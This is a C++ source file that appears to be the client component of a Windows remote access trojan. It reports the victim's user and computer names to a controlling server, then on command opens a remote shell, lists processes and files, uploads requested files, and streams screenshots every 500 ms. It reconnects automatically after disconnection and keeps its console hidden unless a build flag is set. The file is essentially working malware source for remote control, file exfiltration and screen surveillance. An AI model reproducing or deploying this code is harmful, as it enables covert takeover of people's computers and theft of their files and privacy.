#include "Application.h"
#include "services/NetClientService.h"
#include "appdefs.h"
#include "../../shared/NetLib/packets/PacketPresentation.h"
#include "../../shared/NetLib/packets/PacketProcess.h"
#include "../../shared/NetLib/packets/PacketFileSystem.h"
#include "../../shared/NetLib/packets/PacketDownload.h"
#include "services/DesktopService.h"
#include "../../shared/NetLib/packets/PacketMediaResponse.h"
#include "../../shared/NetLib/packets/PacketShell.h"
#include "concurrent/core/Thread.h"
#include "../../shared/IOLib/services/FileSystemService.h"
#include "services/ProcessService.h"
#include <io.h>
#include <fcntl.h>
#include <iostream>

DWORD WINAPI startClientAsyncThreadFunc(LPVOID threadArg)
{
	auto netClientService = static_cast<NetClientService*>(threadArg);
	netClientService->start();
	return 0;
}


Application::Application() : netClientService(nullptr), shellService(this)
{
}

Application::~Application()
{
}

void Application::onClientExited(const char* str)
{
	std::cout << str << std::endl;
	Sleep(10000);
	startNetSubsystem();
}

void Application::onConnectionEstablished()
{
	// SystemInfoStruct* sysInfo = systemInfoService.getBasicSystemInfo();

	char* userName = new char[INFO_BUFFER_SIZE];
	char* pcName = new char[INFO_BUFFER_SIZE];
	// Get and display the user name. 
	DWORD bufCharCount = INFO_BUFFER_SIZE;
	if (!GetUserNameA(userName, &bufCharCount))
	{
	}
	bufCharCount = INFO_BUFFER_SIZE;
	if (!GetComputerNameA(pcName, &bufCharCount))
	{
	}

	PacketPresentation* packet = new PacketPresentation();
	packet->username = userName;
	packet->pcName = pcName;

	// std::cout << "Packet size " << packet->getTotalLength() << std::endl;
	netClientService->sendPacket(packet);
}

void Application::onSystemInformationRequested(PacketPresentation* packet)
{
}

void Application::onShellClosed() const
{
	PacketShell* packet = new PacketShell();
	packet->action = PacketShellAction::Stop;
	netClientService->sendPacket(packet);
}

void Application::onShellOutput(char* buffer, DWORD bufferLen) const
{
	PacketShell* packet = new PacketShell();
	packet->action = PacketShellAction::MoreData;
	packet->data = std::string(buffer, bufferLen);
	netClientService->sendPacket(packet);
}

void Application::shellAction(PacketShellAction action, const std::string& data)
{
	if (action == PacketShellAction::Start)
	{
		if (!shellService.isRunning())
			shellService.launch();
	}
	else if (action == PacketShellAction::PushCommand)
	{
		if (shellService.isRunning())
			shellService.writeIntoProcess(data);
	}
}

Application* Application::start()
{
	auto app = new Application;
	app->run();
	return app;
}

bool Application::run()
{
#if SHOW_CONSOLE
	AllocConsole();
	SetConsoleTitleA("Client");
	typedef struct
	{
		char* _ptr;
		int _cnt;
		char* _base;
		int _flag;
		int _file;
		int _charbuf;
		int _bufsiz;
		char* _tmpfname;
	} FILE_COMPLETE;
	*(FILE_COMPLETE*)stdout = *(FILE_COMPLETE*)_fdopen(_open_osfhandle((long)GetStdHandle(STD_OUTPUT_HANDLE), _O_TEXT),
	                                                   "w");
	*(FILE_COMPLETE*)stderr = *(FILE_COMPLETE*)_fdopen(_open_osfhandle((long)GetStdHandle(STD_ERROR_HANDLE), _O_TEXT),
	                                                   "w");
	*(FILE_COMPLETE*)stdin = *(FILE_COMPLETE*)_fdopen(_open_osfhandle((long)GetStdHandle(STD_INPUT_HANDLE), _O_TEXT),
	                                                  "r");
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
#endif

	startNetSubsystem();
	return true;
}

void Application::onProcessListRequested() const
{
	PacketProcess* packetProcess = new PacketProcess;
	ProcessService::getProcessList(packetProcess->processes);
	// auto event = new PacketNetEvent(packetProcess);
	netClientService->sendPacket(packetProcess);
}

void Application::onFileSystemRequested(PacketFileSystem* packetFileSystem) const
{
	if (packetFileSystem->path.empty() || packetFileSystem->path == L"/"
		|| packetFileSystem->path == L"\\")
		FileSystemService::listRoots(packetFileSystem->files);
	else
		FileSystemService::listFilesW(packetFileSystem->path, packetFileSystem->files);

	// Make it recalculate payloadLength
	packetFileSystem->calculatePayloadLength();
	netClientService->sendPacket(packetFileSystem);
}

void Application::downloadRequested(PacketDownload* packetDownload)
{
	if (FileSystemService::fileExists(packetDownload->filePath))
	{
		packetDownload->fileSize = FileSystemService::getFileSize(packetDownload->filePath);
		packetDownload->fileBytes = (char*)malloc(packetDownload->fileSize);
		FileSystemService::readBinaryFile(packetDownload->filePath.c_str(),
		                                  packetDownload->fileBytes, packetDownload->fileSize);
		packetDownload->calculatePayloadLength();
		netClientService->sendPacket(packetDownload);
	}
}

void Application::desktopRequested() const
{
	// TODO: this is blocking, so move it away, it is just for testing
	while (true)
	{
		std::pair<ULONGLONG, char*> bufferImage = DesktopService::getScreenShotAsByteArray();
		const auto packetDesktop = new PacketMediaResponse(PacketType::Desktop);
		packetDesktop->imageSize = bufferImage.first;
		packetDesktop->imageBytes = bufferImage.second;
		netClientService->sendPacket(packetDesktop);
		Sleep(500);
	}
}

void Application::startNetSubsystem()
{
	netClientService = new NetClientService(this);

	netClientThread = new Thread(
		static_cast<LPTHREAD_START_ROUTINE>(startClientAsyncThreadFunc),
		netClientService);

	netClientThread->run();
	netClientThread->join();
}
